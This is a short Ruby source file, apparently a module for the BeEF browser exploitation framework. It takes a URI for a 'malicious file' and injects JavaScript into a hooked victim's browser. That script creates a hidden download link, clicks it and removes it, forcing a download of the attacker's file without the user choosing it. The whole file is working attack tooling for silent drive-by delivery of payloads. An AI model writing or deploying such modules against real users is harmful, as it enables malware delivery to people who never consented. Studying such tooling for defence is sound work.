class Lcamtuf_download < BeEF::Core::Command
  def self.options
    [
      {
        'name' => 'malicious_file_uri',
        'description' => 'The web accessible URI for the malicious file.',
        'ui_label' => 'Malicious File Path',
        'value' => '',
        'width' => '300px'
      }
    ]
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end

  def pre_send
    malicious_file_uri = @datastore['malicious_file_uri']
    js = %Q{
      var a = document.createElement('a');
      a.href = '#{malicious_file_uri}';
      a.download = '';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }
    BeEF::Core::Network::Handlers::asset_host.inject(js)
  end
end
